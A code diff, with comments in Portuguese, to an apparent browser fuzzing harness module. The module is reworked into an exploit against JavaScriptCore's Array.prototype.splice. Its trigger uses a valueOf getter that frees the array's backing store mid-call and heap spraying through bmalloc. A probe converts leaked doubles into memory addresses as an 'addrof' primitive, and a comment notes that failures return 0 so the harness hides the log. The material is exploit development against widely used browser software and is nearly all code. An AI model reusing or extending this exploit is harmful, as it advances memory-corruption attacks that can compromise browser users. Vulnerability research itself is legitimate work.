@@ -1,72 +1,89 @@
+
 export default {
     id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
-    category: 'CoreJS',
+    category: 'Exploit',
     risk:     'CRITICAL',
     description:
-        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
-        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
-        'forçando uma leitura de memória fantasma (Dangling Pointer).',
+        'Primitiva addrof definitiva via Butterfly. Coerção do argumento start no splice() ' +
+        'destrói a memória síncronamente. Pulverização do bmalloc com blocos de tamanho 20 ' +
+        'para sobrepor a memória e converter ponteiros nativos em Float64.',
 
     setup: function() {
         this.results = {};
         
-        // Criamos o array vulnerável (Array de Doubles)
-        this.vulnArray = [];
-        for (let i = 0; i < 20; i++) {
-            this.vulnArray.push(1.111111 + i);
-        }
+        // 1. O array vulnerável com o tamanho exato que funcionou no seu baseline
+        this.vulnArray = new Array(20).fill(1.111111);
+        
+        // 2. A Cobaia
+        this.targetObj = document.createElement('div');
+        this.targetObj.id = "HOLY_GRAIL";
 
         const self = this;
+        
+        // 3. A Bomba Relógio
         this.evilObject = {
             valueOf: function() {
-                // Destruímos o array original
+                // Encolhe o array, libertando o Butterfly antigo
                 self.vulnArray.length = 0;
                 
-                // FIX: O Spray correto. Pulverizamos ARRAYS (bmalloc) e não DOM!
-                // O objetivo é que um destes caia no buraco deixado pela Butterfly morta.
+                // Pulverizamos o bmalloc APENAS com arrays do mesmo tamanho (20)
+                // contendo a nossa cobaia (ArrayWithContiguous)
                 self.trash = [];
-                for(let i = 0; i < 500; i++) {
-                    self.trash.push(new Array(20).fill(13.373737));
+                for(let i = 0; i < 1500; i++) {
+                    self.trash.push(new Array(20).fill(self.targetObj));
                 }
                 
-                return 5; // Retorna 5 para o splice() continuar e cortar a partir do índice 5
+                return 0; // Retorna 0 para o splice() iniciar a sua lógica
             }
         };
     },
 
     trigger: function() {
         try {
-            // FIX: O GATILHO. Passamos o evilObject como o índice 'start'.
-            // Isto força o WebKit a invocar o valueOf() antes de fazer qualquer movimento de memória!
-            this.vulnArray.splice(this.evilObject, 1, 9.999999);
+            // O GATILHO: Força a coerção do parâmetro start.
+            // Escreve 9.999999 no índice 0, corrompendo a memória vizinha.
+            this.vulnArray.splice(this.evilObject, 0, 9.999999);
         } catch(e) {
             this.results.error = e.message;
         }
     },
 
     probe: [
-        // Probe 0: O C++ ignorou o nosso length = 0? (Deve manter 20 devido ao splice C++)
-        s => s.vulnArray.length,
+        s => s.results.error || 'Splice Executado',
         
-        // Probe 1: O Array mudou para Contiguous ou continuou Double?
-        s => typeof s.vulnArray[10],
-        
-        // Probe 2: O Leitor de OOB
+        // O Extrator addrof SILENCIOSO (Só fala se capturar o troféu)
         s => {
-            let val = s.vulnArray[10];
-            
-            // Se lemos um número, e não é o 11.111111 (que era o original no índice 10),
-            // nem undefined (que seria o normal se o array fosse realmente 0)...
-            if (typeof val === 'number' && !isNaN(val) && val !== (1.111111 + 10)) {
-                return `💥 SUCESSO! OOB Read (Lixo da RAM): ${val}`;
+            // Vamos varrer os índices restantes que deviam estar vazios
+            for(let i = 1; i < 20; i++) {
+                let val = s.vulnArray[i];
+                
+                // Se encontrarmos um número que não estava lá...
+                if (typeof val === 'number' && val !== 1.111111 && val !== 9.999999 && val !== 0 && !isNaN(val)) {
+                    
+                    const buf = new ArrayBuffer(8);
+                    const f64 = new Float64Array(buf);
+                    const u64 = new BigUint64Array(buf);
+                    
+                    f64[0] = val;
+                    const addr = u64[0] & 0x0000FFFFFFFFFFFFn;
+                    
+                    // Se for um ponteiro Userspace válido
+                    if (addr > 0x100000n) {
+                        return `🏆 ADDROF SUCESSO: 0x${addr.toString(16).toUpperCase()} no índice [${i}]`;
+                    }
+                }
             }
-            return 'Protegido / Array Vazio';
+            // Se falhar o alinhamento, retorna o número 0.
+            // O executor vê que o Baseline (0) == Pós-Free (0) e esconde o log. Fuzzer limpo!
+            return 0; 
         }
     ],
 
     cleanup: function() {
         this.vulnArray = null;
         this.evilObject = null;
+        this.targetObj = null;
         this.trash = null;
+        this.results = {};
     }
 };
